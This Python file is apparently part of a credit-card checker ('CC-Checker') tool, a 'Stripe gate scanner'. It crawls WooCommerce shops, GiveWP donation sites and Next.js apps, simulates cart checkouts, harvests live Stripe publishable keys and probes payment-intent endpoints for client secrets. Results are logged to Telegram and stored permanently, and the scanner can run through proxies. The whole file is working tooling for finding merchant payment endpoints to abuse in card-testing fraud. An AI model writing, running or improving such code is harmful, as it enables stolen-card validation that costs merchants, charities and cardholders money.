"""
gateways/stripe_scraper.py — Intelligent Stripe Gate Scanner v5

True WooCommerce checkout simulation:
  1. Detect site type (WC / GiveWP / Next.js / Custom)
  2. WooCommerce: Find product → Add to cart → Checkout → Extract pk_live_
  3. GiveWP: Find donation form → Extract pk_live_ → Probe endpoint
  4. Next.js: Scan JS chunks → Find pk_live_ → Probe API routes
  5. Custom: Full page crawl + JS scan

Live Logging:
  Every step is logged in real-time to Telegram via LiveLogger.

Data storage:
  HTML/JS content → in-memory only (discarded after scan)
  pk_live_ keys + working endpoints → Turso cloud DB (permanent)
"""
import asyncio
import re
import json
import time
import logging
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse, urlencode, quote
from typing import Optional

import aiohttp
from aiohttp import ClientTimeout

logger = logging.getLogger("CC-Checker.Scanner")

PAGE_TIMEOUT     = ClientTimeout(total=20)
JS_TIMEOUT       = ClientTimeout(total=12)
ENDPOINT_TIMEOUT = ClientTimeout(total=10)
CART_TIMEOUT     = ClientTimeout(total=15)

# ── Headers ────────────────────────────────────────────────────────────────────
BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/125.0.0.0 Safari/537.36"
)

BROWSER_HEADERS = {
    "User-Agent": BROWSER_UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
}

AJAX_HEADERS = {
    "User-Agent": BROWSER_UA,
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
}

JSON_HEADERS = {
    "User-Agent": BROWSER_UA,
    "Accept": "application/json, */*",
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
}

# ── Regex ──────────────────────────────────────────────────────────────────────
PK_LIVE_RE  = re.compile(r'pk_live_[a-zA-Z0-9]{20,120}')
PK_TEST_RE  = re.compile(r'pk_test_[a-zA-Z0-9]{20,120}')
SECRET_RE   = re.compile(
    r'(?:pi|seti)_[a-zA-Z0-9_\-]{10,100}_secret_[a-zA-Z0-9]{10,60}'
)

# WooCommerce-specific patterns
WC_PARAMS_RE = re.compile(
    r'(?:wc_stripe_params|woocommerce_stripe_params|wc_stripe_upe_params'
    r'|wc_stripe_payment_request_params)\s*[=:]\s*(\{[^;]{10,3000}\})',
    re.DOTALL,
)
# GiveWP patterns
GIVE_PARAMS_RE = re.compile(
    r'(?:give_stripe_vars|give_global_vars|giveStripeVars)\s*[=:]\s*(\{[^;]{10,2000}\})',
    re.DOTALL,
)

# Product ID from WooCommerce
WC_PRODUCT_ID_RE = re.compile(
    r'(?:add-to-cart|product_id|data-product_id|name="add-to-cart"[^>]+value)'
    r'[="\s>]*?(\d{2,8})',
    re.IGNORECASE,
)
# JS file URLs
JS_SRC_RE   = re.compile(r'<script[^>]+src=["\']((?:https?://[^"\']+|/[^"\']+)\.js[^"\']*)["\']', re.I)
HREF_RE     = re.compile(r'href=["\'](/[^"\'#?\s][^"\']*)["\']', re.I)
PRODUCT_URL_RE = re.compile(
    r'href=["\']((?:https?://[^"\']+)?/(?:product|shop|item|store|buy)[^"\']*)["\']',
    re.IGNORECASE,
)

# API route from JS fetch/axios calls
FETCH_RE    = re.compile(
    r'(?:fetch|axios(?:\.post|\.get|\.put)?)\s*\(\s*["\'](/[^"\'?#\s]{2,100})["\']',
    re.IGNORECASE,
)

# Next.js manifest
NEXT_MANIFEST_RE = re.compile(r'/_next/static/[a-z0-9_\-]+/[a-z0-9_\-]+\.js')
NEXT_DATA_RE     = re.compile(r'<script[^>]+id="__NEXT_DATA__"[^>]*>([^<]+)</script>')

# WooCommerce nonce
WC_NONCE_RE = re.compile(
    r'(?:wc_checkout_params|woocommerce_params)\s*=\s*\{[^}]*"nonce"\s*:\s*"([a-f0-9]{10,})"',
    re.IGNORECASE,
)

# ── Common Endpoints ───────────────────────────────────────────────────────────
ENDPOINTS = [
    # WooCommerce (top priority)
    {"path": "/?wc-ajax=stripe_create_payment_intent",      "method": "POST", "form": True,  "type": "payment_intent"},
    {"path": "/?wc-ajax=create_stripe_setup_intent",        "method": "POST", "form": True,  "type": "setup_intent"},
    {"path": "/?wc-ajax=wc_stripe_create_payment_intent",   "method": "POST", "form": True,  "type": "payment_intent"},
    # GiveWP
    {"path": "/?give_action=create_payment_intent",         "method": "POST", "form": True,  "type": "payment_intent"},
    {"path": "/wp-json/give-api/v2/payment-intent",         "method": "POST", "form": False, "type": "payment_intent"},
    # Generic REST
    {"path": "/api/stripe/create-payment-intent",           "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/create-payment-intent",                  "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/payment/create-intent",                  "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/payments/intent",                        "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/stripe/intent",                          "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/checkout",                               "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/stripe",                                 "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/payment",                                "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/donate",                                 "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/api/donation",                               "method": "POST", "form": False, "type": "payment_intent"},
    # Setup intents
    {"path": "/api/stripe/setup-intent",                    "method": "POST", "form": False, "type": "setup_intent"},
    {"path": "/api/setup-intent",                           "method": "POST", "form": False, "type": "setup_intent"},
    # Laravel / PHP
    {"path": "/stripe/create-payment-intent",               "method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/checkout/stripe/create",                     "method": "POST", "form": True,  "type": "payment_intent"},
    # WP REST
    {"path": "/wp-json/wc/v3/payments/stripe/create-intent","method": "POST", "form": False, "type": "payment_intent"},
    {"path": "/wp-json/wc-stripe/v1/payment-intent",        "method": "POST", "form": False, "type": "payment_intent"},
]


# ── ScanResult ────────────────────────────────────────────────────────────────
@dataclass
class ScanResult:
    domain: str = ""
    url: str = ""
    pk_live_keys: list[str] = field(default_factory=list)
    pk_test_keys: list[str] = field(default_factory=list)
    api_routes: list[str]   = field(default_factory=list)
    working_endpoint: dict  = field(default_factory=dict)
    pages_scanned: list[str] = field(default_factory=list)
    js_files_scanned: int   = 0
    is_working: bool        = False
    error: str              = ""
    scan_time: float        = 0.0
    method_used: str        = ""
    site_type: str          = "unknown"


# ── Helpers ───────────────────────────────────────────────────────────────────
def _extract_keys(text: str) -> tuple[list[str], list[str]]:
    live = set(PK_LIVE_RE.findall(text))
    test = set(PK_TEST_RE.findall(text))

    # Extra patterns
    for m in re.finditer(
        r'(?:Stripe|loadStripe|publishableKey|stripeKey|key|apiKey)\s*[=:(,]\s*["\']?(pk_live_[a-zA-Z0-9]{20,120})',
        text, re.IGNORECASE
    ):
        live.add(m.group(1))

    # WC params blob
    for m in WC_PARAMS_RE.finditer(text):
        for k in PK_LIVE_RE.findall(m.group(1)):
            live.add(k)
    for m in GIVE_PARAMS_RE.finditer(text):
        for k in PK_LIVE_RE.findall(m.group(1)):
            live.add(k)

    # __NEXT_DATA__
    for m in NEXT_DATA_RE.finditer(text):
        try:
            data = json.loads(m.group(1))
            raw  = json.dumps(data)
            for k in PK_LIVE_RE.findall(raw):
                live.add(k)
        except Exception:
            pass

    return list(live), list(test)


def _extract_secret(raw: str) -> Optional[str]:
    m = SECRET_RE.search(raw)
    return m.group(0) if m else None


def _intent_type(secret: str) -> str:
    return "setup_intent" if secret.startswith("seti_") else "payment_intent"


def _is_wordpress(html: str) -> bool:
    return any(x in html for x in ["wp-content", "wp-json", "wordpress"])


def _is_woocommerce(html: str) -> bool:
    return any(x in html for x in ["woocommerce", "wc-ajax", "add-to-cart", "wc_cart"])


def _is_givewp(html: str) -> bool:
    return any(x in html for x in ["give-plugin", "give_stripe", "give_action", "givewp", "data-give"])


def _has_stripe_js(html: str) -> bool:
    return any(x in html for x in ["js.stripe.com", "stripe.js", "stripe-js", "Stripe("])


async def _fetch(
    session: aiohttp.ClientSession,
    url: str,
    cache: dict,
    timeout: ClientTimeout = None,
    proxy_kwargs: dict = None,
    headers: dict = None,
) -> str:
    if url in cache:
        return cache[url]
    kw = {
        "timeout":  timeout or PAGE_TIMEOUT,
        "ssl":      False,
        "allow_redirects": True,
        "headers":  headers or BROWSER_HEADERS,
    }
    if proxy_kwargs:
        kw.update(proxy_kwargs)
    try:
        async with session.get(url, **kw) as r:
            if r.status in (200, 206):
                text = await r.text(errors="ignore")
                cache[url] = text[:300_000]
                return cache[url]
    except Exception as e:
        logger.debug(f"Fetch {url[:60]}: {e}")
    return ""


# ── WooCommerce cart flow ─────────────────────────────────────────────────────
async def _woo_add_to_cart_and_checkout(
    session: aiohttp.ClientSession,
    base_url: str,
    cache: dict,
    proxy_kwargs: dict,
    log,
) -> tuple[list[str], list[str]]:
    """
    Simulate real WooCommerce checkout:
    1. Find any purchasable product
    2. Add to cart (session cookie set)
    3. Visit checkout page
    4. Extract pk_live_ from wc_stripe_params

    Returns (live_keys, test_keys)
    """
    await log("Looking for products...", "search")

    # ── Step 1: Find a product URL ─────────────────────────────────────────
    product_urls = set()

    # Check /shop page first
    shop_html = await _fetch(session, base_url.rstrip("/") + "/shop/", cache, proxy_kwargs=proxy_kwargs)
    if not shop_html:
        shop_html = await _fetch(session, base_url.rstrip("/") + "/store/", cache, proxy_kwargs=proxy_kwargs)
    if not shop_html:
        shop_html = cache.get(base_url, "")

    for m in PRODUCT_URL_RE.finditer(shop_html):
        u = m.group(1)
        if not u.startswith("http"):
            u = base_url.rstrip("/") + u
        if base_url in u or u.startswith("/"):
            product_urls.add(u)

    # Also check homepage
    home_html = await _fetch(session, base_url, cache, proxy_kwargs=proxy_kwargs)
    for m in PRODUCT_URL_RE.finditer(home_html):
        u = m.group(1)
        if not u.startswith("http"):
            u = base_url.rstrip("/") + u
        product_urls.add(u)

    # ── Step 2: Get product ID and add to cart ────────────────────────────
    added = False
    for prod_url in list(product_urls)[:5]:
        await log(f"Product: {prod_url.split('/')[-2] or prod_url}", "product")

        prod_html = await _fetch(session, prod_url, cache, proxy_kwargs=proxy_kwargs)
        if not prod_html:
            continue

        # Find product IDs
        pids = WC_PRODUCT_ID_RE.findall(prod_html)
        if not pids:
            # Try meta tags
            for m in re.finditer(r'data-product[_-]id[="\s]+(\d{2,8})', prod_html, re.I):
                pids.append(m.group(1))
        if not pids:
            # Try URL itself for ID
            for m in re.finditer(r'/product/[^/]+/\?p=(\d+)', prod_url):
                pids.append(m.group(1))

        for pid in pids[:2]:
            await log(f"Adding to cart (ID={pid})...", "cart")
            try:
                add_url = base_url.rstrip("/") + f"/?add-to-cart={pid}&quantity=1"
                kw = {
                    "timeout": CART_TIMEOUT,
                    "ssl": False,
                    "allow_redirects": True,
                    "headers": {
                        **BROWSER_HEADERS,
                        "Referer": prod_url,
                    },
                }
                if proxy_kwargs:
                    kw.update(proxy_kwargs)
                async with session.get(add_url, **kw) as r:
                    if r.status in (200, 302):
                        added = True
                        await log(f"Cart item added ✅ (ID={pid})", "ok")
                        break

                # Also try POST form
                kw2 = {
                    "timeout": CART_TIMEOUT,
                    "ssl": False,
                    "allow_redirects": True,
                    "headers": {**BROWSER_HEADERS, "Referer": prod_url},
                    "data": {"add-to-cart": pid, "quantity": "1"},
                }
                if proxy_kwargs:
                    kw2.update(proxy_kwargs)
                async with session.post(prod_url, **kw2) as r:
                    if r.status in (200, 302):
                        added = True
                        break
            except Exception as e:
                logger.debug(f"Add to cart error {pid}: {e}")
            if added:
                break
        if added:
            break

    # ── Step 3: Visit checkout ─────────────────────────────────────────────
    await log("Visiting checkout page...", "stripe")
    checkout_url = base_url.rstrip("/") + "/checkout/"
    kw = {
        "timeout": PAGE_TIMEOUT,
        "ssl": False,
        "allow_redirects": True,
        "headers": {
            **BROWSER_HEADERS,
            "Referer": base_url.rstrip("/") + "/cart/",
        },
    }
    if proxy_kwargs:
        kw.update(proxy_kwargs)

    checkout_html = ""
    try:
        async with session.get(checkout_url, **kw) as r:
            if r.status == 200:
                checkout_html = await r.text(errors="ignore")
                cache[checkout_url] = checkout_html[:300_000]
    except Exception as e:
        logger.debug(f"Checkout fetch error: {e}")

    if not checkout_html:
        checkout_html = await _fetch(session, checkout_url, cache, proxy_kwargs=proxy_kwargs)

    # ── Step 4: Extract keys from checkout ────────────────────────────────
    live, test = _extract_keys(checkout_html)

    if live:
        await log(f"Found pk_live_ in checkout HTML! ✅", "key")
        return live, test

    # Checkout JS files
    await log("Scanning checkout JS files...", "js")
    for m in JS_SRC_RE.finditer(checkout_html):
        src = m.group(1)
        if not src.startswith("http"):
            src = urljoin(base_url, src)
        if any(k in src.lower() for k in ("stripe", "payment", "checkout", "woocommerce")):
            js = await _fetch(session, src, cache, timeout=JS_TIMEOUT, proxy_kwargs=proxy_kwargs)
            if js:
                l, t = _extract_keys(js)
                if l:
                    live.extend(l)
                    test.extend(t)
                    await log(f"Found pk_live_ in JS: {src.split('/')[-1][:30]}", "key")
                    return live, test

    return live, test


# ── GiveWP donation flow ──────────────────────────────────────────────────────
async def _give_extract_key(
    session: aiohttp.ClientSession,
    base_url: str,
    cache: dict,
    proxy_kwargs: dict,
    log,
) -> tuple[list[str], list[str]]:
    """Extract pk_live_ from GiveWP donation form."""
    await log("GiveWP donation site detected!", "stripe")

    # Common GiveWP donation page patterns
    give_pages = [
        "/donate/", "/give/", "/giving/", "/donation/",
        "/support/", "/contribute/",
    ]

    for page_path in give_pages:
        url = base_url.rstrip("/") + page_path
        html = await _fetch(session, url, cache, proxy_kwargs=proxy_kwargs)
        if not html:
            continue
        live, test = _extract_keys(html)
        if live:
            await log(f"Found pk_live_ on {page_path}", "key")
            return live, test

        # Scan JS on this page
        for m in JS_SRC_RE.finditer(html):
            src = m.group(1)
            if not src.startswith("http"):
                src = urljoin(base_url, src)
            if any(k in src.lower() for k in ("stripe", "give", "donate")):
                js = await _fetch(session, src, cache, timeout=JS_TIMEOUT, proxy_kwargs=proxy_kwargs)
                if js:
                    l, t = _extract_keys(js)
                    if l:
                        return l, t

    # Homepage
    home = await _fetch(session, base_url, cache, proxy_kwargs=proxy_kwargs)
    return _extract_keys(home)


# ── Next.js / React app key extraction ───────────────────────────────────────
async def _nextjs_extract_key(
    session: aiohttp.ClientSession,
    base_url: str,
    cache: dict,
    proxy_kwargs: dict,
    log,
) -> tuple[list[str], list[str]]:
    """Extract pk_live_ from Next.js static chunks."""
    await log("Next.js/React app detected — scanning JS bundles...", "js")
    live: set[str] = set()
    test: set[str] = set()

    home = await _fetch(session, base_url, cache, proxy_kwargs=proxy_kwargs)
    if not home:
        return [], []

    # __NEXT_DATA__ often contains the key
    for m in NEXT_DATA_RE.finditer(home):
        try:
            data = json.loads(m.group(1))
            raw = json.dumps(data)
            for k in PK_LIVE_RE.findall(raw):
                live.add(k)
        except Exception:
            pass

    if live:
        await log("Found pk_live_ in __NEXT_DATA__!", "key")
        return list(live), list(test)

    # Scan all JS chunks
    js_urls = set()
    for m in JS_SRC_RE.finditer(home):
        u = m.group(1)
        if not u.startswith("http"):
            u = urljoin(base_url, u)
        js_urls.add(u)
    for m in NEXT_MANIFEST_RE.finditer(home):
        u = urljoin(base_url, m.group(0))
        js_urls.add(u)

    await log(f"Scanning {len(js_urls)} JS chunks...", "js")
    sem = asyncio.Semaphore(6)

    async def scan_one(js_url: str):
        async with sem:
            js = await _fetch(session, js_url, cache, timeout=JS_TIMEOUT, proxy_kwargs=proxy_kwargs)
            if js:
                l, t = _extract_keys(js)
                live.update(l)
                test.update(t)

    await asyncio.gather(*[scan_one(u) for u in list(js_urls)[:25]])
    if live:
        await log(f"Found pk_live_ in JS bundles! ({len(live)} keys)", "key")
    return list(live), list(test)


# ── Endpoint prober ───────────────────────────────────────────────────────────
async def _probe_endpoints(
    session: aiohttp.ClientSession,
    base_url: str,
    pk_key: str,
    proxy_kwargs: dict,
    log,
    extra_routes: list[str] = None,
) -> Optional[dict]:
    """Probe all common endpoints + JS-discovered routes."""
    found = []
    sem   = asyncio.Semaphore(4)

    all_eps = list(ENDPOINTS)
    if extra_routes:
        for r in extra_routes:
            if any(k in r.lower() for k in ("stripe", "payment", "intent", "donate", "checkout")):
                all_eps.insert(0, {"path": r, "method": "POST", "form": False, "type": "payment_intent"})

    await log(f"Probing {len(all_eps)} endpoints...", "search")

    async def try_one(ep: dict):
        async with sem:
            if found:
                return
            path     = ep["path"]
            full_url = path if path.startswith("http") else base_url.rstrip("/") + path
            payload  = {"amount": 100, "currency": "usd"}

            # Form-encoded (WooCommerce style)
            if ep.get("form"):
                kw = {
                    "timeout": ENDPOINT_TIMEOUT, "ssl": False,
                    "allow_redirects": False,
                    "headers": AJAX_HEADERS,
                    "data": urlencode(payload),
                }
                if proxy_kwargs:
                    kw.update(proxy_kwargs)
                try:
                    async with session.post(full_url, **kw) as r:
                        if r.status in (200, 201):
                            text = await r.text(errors="ignore")
                            secret = _extract_secret(text)
                            if secret:
                                found.append({
                                    "pk_key": pk_key,
                                    "endpoint": path,
                                    "method": "POST",
                                    "intent_type": _intent_type(secret),
                                    "client_secret": secret,
                                })
                                return
                except Exception:
                    pass

            # JSON (REST API style)
            kw2 = {
                "timeout": ENDPOINT_TIMEOUT, "ssl": False,
                "allow_redirects": False,
                "headers": JSON_HEADERS,
                "json": payload,
            }
            if proxy_kwargs:
                kw2.update(proxy_kwargs)
            try:
                async with session.post(full_url, **kw2) as r:
                    if r.status in (200, 201):
                        try:
                            data   = await r.json(content_type=None)
                            raw    = json.dumps(data)
                        except Exception:
                            raw = await r.text(errors="ignore")
                        secret = _extract_secret(raw)
                        if secret:
                            found.append({
                                "pk_key": pk_key,
                                "endpoint": path,
                                "method": "POST",
                                "intent_type": _intent_type(secret),
                                "client_secret": secret,
                            })
            except Exception:
                pass

    await asyncio.gather(*[try_one(ep) for ep in all_eps])
    return found[0] if found else None


# ── Generic JS full scan ──────────────────────────────────────────────────────
async def _full_js_scan(
    session: aiohttp.ClientSession,
    base_url: str,
    cache: dict,
    proxy_kwargs: dict,
    log,
) -> tuple[list[str], list[str], list[str]]:
    """
    Scan homepage + all sub-pages + all JS files.
    Returns (live_keys, test_keys, api_routes)
    """
    live:   set[str] = set()
    test:   set[str] = set()
    routes: set[str] = set()

    sub_pages = [
        "/", "/checkout", "/cart", "/shop", "/store",
        "/donate", "/give", "/payment", "/pricing",
        "/subscribe", "/membership", "/pay",
    ]

    js_to_scan: set[str] = set()
    sem = asyncio.Semaphore(4)

    # Fetch all sub-pages
    async def fetch_page(path: str):
        url  = base_url.rstrip("/") + path
        html = await _fetch(session, url, cache, proxy_kwargs=proxy_kwargs)
        if not html:
            return
        l, t = _extract_keys(html)
        live.update(l); test.update(t)
        for m in JS_SRC_RE.finditer(html):
            src = m.group(1)
            if not src.startswith("http"):
                src = urljoin(base_url, src)
            js_to_scan.add(src)
        # Collect fetch() API routes
        for m in FETCH_RE.finditer(html):
            routes.add(m.group(1))

    await asyncio.gather(*[fetch_page(p) for p in sub_pages])
    await log(f"Scanned {len(sub_pages)} pages, found {len(js_to_scan)} JS files", "search")

    if live:
        return list(live), list(test), list(routes)

    # Prioritize Stripe/payment JS
    priority = [u for u in js_to_scan if any(
        k in u.lower() for k in ("stripe", "payment", "checkout", "cart", "pay", "woo")
    )]
    others   = [u for u in js_to_scan if u not in priority]
    all_js   = (priority + others)[:30]

    await log(f"Scanning {len(all_js)} JS files...", "js")

    async def scan_js(js_url: str):
        async with sem:
            js = await _fetch(session, js_url, cache, timeout=JS_TIMEOUT, proxy_kwargs=proxy_kwargs)
            if js:
                l, t = _extract_keys(js)
                live.update(l); test.update(t)
                for m in FETCH_RE.finditer(js):
                    routes.add(m.group(1))

    await asyncio.gather(*[scan_js(u) for u in all_js])
    return list(live), list(test), list(routes)


# ── Main scan function ─────────────────────────────────────────────────────────
async def scan_site(
    url: str,
    proxy: dict = None,
    tg_msg=None,
) -> ScanResult:
    """
    Intelligent Stripe gate scanner v5.

    Detection flow:
      1. Fetch homepage → detect site type
      2. WooCommerce → cart flow → checkout → pk_live_
      3. GiveWP → donation page → pk_live_
      4. Next.js → JS chunks → pk_live_
      5. Generic → full page + JS scan
      6. Probe endpoints with found pk_live_

    Args:
        url: Target URL
        proxy: Proxy dict (optional, recommended)
        tg_msg: Telegram message for live logging (optional)
    """
    from core.live_logger import LiveLogger

    if not url.startswith("http"):
        url = "https://" + url
    parsed   = urlparse(url)
    domain   = parsed.netloc
    base_url = f"{parsed.scheme}://{domain}"

    result = ScanResult(domain=domain, url=url)
    start  = time.monotonic()
    cache: dict[str, str] = {}

    log = LiveLogger(tg_msg=tg_msg, domain=domain)

    # Build proxy kwargs / connector
    proxy_kwargs = {}
    if proxy:
        from core.proxy_manager import get_connector, get_proxy_kwargs
        connector    = get_connector(proxy)
        proxy_kwargs = get_proxy_kwargs(proxy)
        await log(f"Using proxy {proxy['host']}:{proxy['port']}", "net")
    else:
        connector = aiohttp.TCPConnector(ssl=False, limit=8, force_close=True)
        await log("No proxy — direct connection", "warn")

    try:
        # Use cookie jar so cart session works
        cookie_jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(
            connector=connector,
            cookie_jar=cookie_jar,
        ) as session:

            # ── Step 1: Detect site type ───────────────────────────────────
            await log(f"Fetching homepage...", "net")
            home = await _fetch(session, base_url, cache, proxy_kwargs=proxy_kwargs)

            if not home:
                result.error = "Site unreachable / timeout"
                await log("Site unreachable", "error", flush=True)
                result.scan_time = time.monotonic() - start
                return result

            # Quick check — does it have Stripe at all?
            if not _has_stripe_js(home):
                await log("Checking subpages for Stripe.js...", "search")
                for path in ["/checkout", "/shop", "/donate", "/give", "/payment"]:
                    sub = await _fetch(session, base_url.rstrip("/") + path, cache, proxy_kwargs=proxy_kwargs)
                    if sub and _has_stripe_js(sub):
                        await log(f"Stripe.js found on {path}", "ok")
                        home = sub
                        break
                else:
                    # Check JS files on homepage for Stripe
                    js_urls = [m.group(1) for m in JS_SRC_RE.finditer(home)]
                    if not any("stripe" in u.lower() for u in js_urls):
                        # Last resort: check pk_live_ directly
                        l, t = _extract_keys(home)
                        if not l and not t:
                            result.error = "No Stripe.js or pk_live_ key found"
                            await log("No Stripe detected on this site", "error", flush=True)
                            result.scan_time = time.monotonic() - start
                            return result

            is_wp  = _is_wordpress(home)
            is_woo = _is_woocommerce(home)
            is_give = _is_givewp(home)

            # Quick check for Stripe — don't bail early, just log warning
            if not _has_stripe_js(home):
                await log("Stripe.js not on homepage — checking subpages...", "search")
                stripe_found_on = None
                for path in ["/checkout", "/shop", "/donate", "/give", "/payment", "/store"]:
                    sub = await _fetch(session, base_url.rstrip("/") + path, cache, proxy_kwargs=proxy_kwargs)
                    if sub and _has_stripe_js(sub):
                        await log(f"Stripe.js found on {path}", "ok")
                        stripe_found_on = path
                        if not is_woo and _is_woocommerce(sub):
                            is_woo = True
                        home = sub
                        break
                if not stripe_found_on:
                    # Check if pk_live_ is directly in any page HTML (some sites inline it)
                    quick_l, quick_t = _extract_keys(home)
                    if quick_l:
                        await log(f"pk_live_ found directly in HTML!", "key")
                    else:
                        # Check JS files for pk_live_ regardless of Stripe.js
                        js_urls = [m.group(1) for m in JS_SRC_RE.finditer(home)]
                        any_pk = False
                        for js_url in js_urls[:10]:
                            if not js_url.startswith("http"):
                                js_url = urljoin(base_url, js_url)
                            js_txt = await _fetch(session, js_url, cache, timeout=JS_TIMEOUT, proxy_kwargs=proxy_kwargs)
                            if js_txt and PK_LIVE_RE.search(js_txt):
                                any_pk = True
                                break
                        if not any_pk and not quick_l and not quick_t:
                            result.error = "No Stripe detected on this site"
                            await log("No Stripe/pk_live_ found on this site", "error", flush=True)
                            result.scan_time = time.monotonic() - start
                            return result

            if is_wp:
                await log(f"WordPress detected {'+ WooCommerce' if is_woo else ''}{'+ GiveWP' if is_give else ''}", "ok")
            else:
                await log("Non-WordPress site", "info")

            # ── Step 2: WooCommerce cart flow ──────────────────────────────
            live_keys: list[str] = []
            test_keys: list[str] = []
            api_routes: list[str] = []

            if is_woo:
                result.site_type = "woocommerce"
                await log("Starting WooCommerce checkout flow...", "cart")
                live_keys, test_keys = await _woo_add_to_cart_and_checkout(
                    session, base_url, cache, proxy_kwargs, log.log
                )

                # Also probe WC endpoint DIRECTLY (works on many WC sites without cart)
                if not live_keys:
                    await log("Trying direct WC endpoint probe (no cart)...", "search")
                    for ep_path in [
                        "/?wc-ajax=stripe_create_payment_intent",
                        "/?wc-ajax=create_stripe_setup_intent",
                    ]:
                        try:
                            kw = {
                                "timeout": ENDPOINT_TIMEOUT, "ssl": False,
                                "allow_redirects": False,
                                "headers": AJAX_HEADERS,
                                "data": "amount=100&currency=usd",
                            }
                            if proxy_kwargs:
                                kw.update(proxy_kwargs)
                            full_ep = base_url.rstrip("/") + ep_path
                            async with session.post(full_ep, **kw) as r:
                                if r.status in (200, 201):
                                    text = await r.text(errors="ignore")
                                    secret = _extract_secret(text)
                                    if secret:
                                        await log(f"Direct WC probe ✅: {ep_path}", "gate")
                                        # Now find the pk_live_ key
                                        await log("Finding pk_live_ key...", "key")
                                        for p in ["/checkout/", "/", "/shop/"]:
                                            pg = await _fetch(session, base_url.rstrip("/") + p, cache, proxy_kwargs=proxy_kwargs)
                                            l, t = _extract_keys(pg)
                                            if l:
                                                live_keys = l
                                                break
                                        if live_keys:
                                            result.working_endpoint = {
                                                "pk_key": live_keys[0],
                                                "endpoint": ep_path,
                                                "method": "POST",
                                                "intent_type": _intent_type(secret),
                                                "client_secret": secret,
                                            }
                                            result.is_working   = True
                                            result.pk_live_keys = live_keys
                                            result.pk_test_keys = test_keys
                                            result.method_used  = "WooCommerce Direct Probe"
                                            result.site_type    = "woocommerce"
                                            await log.found_gate(ep_path)
                                            result.scan_time = time.monotonic() - start
                                            result.pages_scanned = list(cache.keys())
                                            return result
                        except Exception as e:
                            logger.debug(f"WC direct probe {ep_path}: {e}")

            # ── Step 3: GiveWP donation flow ───────────────────────────────
            elif is_give:
                result.site_type = "givewp"
                live_keys, test_keys = await _give_extract_key(
                    session, base_url, cache, proxy_kwargs, log.log
                )

            # ── Step 4: Next.js / React ────────────────────────────────────
            elif "/_next/static" in home or "__NEXT_DATA__" in home:
                result.site_type = "nextjs"
                live_keys, test_keys = await _nextjs_extract_key(
                    session, base_url, cache, proxy_kwargs, log.log
                )

            # ── Step 5: Generic full scan ──────────────────────────────────
            else:
                result.site_type = "generic"
                await log("Generic site — full page + JS scan...", "search")
                live_keys, test_keys, api_routes = await _full_js_scan(
                    session, base_url, cache, proxy_kwargs, log.log
                )

            # Also try homepage direct keys if we have nothing
            if not live_keys:
                l, t = _extract_keys(home)
                live_keys.extend(l)
                test_keys.extend(t)

            result.pk_live_keys = list(set(live_keys))
            result.pk_test_keys = list(set(test_keys))
            result.api_routes   = api_routes

            if not live_keys and not test_keys:
                result.error = f"No Stripe key found (type={result.site_type})"
                await log(f"No pk_live_ key found on {result.site_type} site", "error", flush=True)
                result.scan_time = time.monotonic() - start
                result.pages_scanned = list(cache.keys())
                return result

            await log.found_key(live_keys[0] if live_keys else test_keys[0])

            if not live_keys:
                result.error = "Only test keys found (no live keys)"
                result.scan_time = time.monotonic() - start
                result.pages_scanned = list(cache.keys())
                return result

            # ── Step 6: Probe endpoints ────────────────────────────────────
            # Collect API routes from all cached pages
            for page_text in list(cache.values())[:8]:
                for m in FETCH_RE.finditer(page_text):
                    api_routes.append(m.group(1))

            endpoint = await _probe_endpoints(
                session, base_url, live_keys[0], proxy_kwargs, log.log,
                extra_routes=list(set(api_routes)),
            )

            if endpoint:
                result.working_endpoint = endpoint
                result.is_working       = True
                result.method_used      = f"{result.site_type} + endpoint probe"
                await log.found_gate(endpoint["endpoint"])
            else:
                result.error = f"pk_live_ found ({live_keys[0][:20]}...) but no accessible payment endpoint"
                await log(f"Key found but no open endpoint", "warn", flush=True)

    except asyncio.TimeoutError:
        result.error = "Global timeout"
        await log("Scan timed out", "error", flush=True)
    except Exception as e:
        result.error = str(e)[:120]
        await log(f"Error: {str(e)[:80]}", "error", flush=True)

    result.pages_scanned = list(cache.keys())
    result.scan_time     = time.monotonic() - start
    await log(
        f"Done in {result.scan_time:.1f}s | Working={result.is_working}",
        "ok" if result.is_working else "info",
        flush=True,
    )
    return result
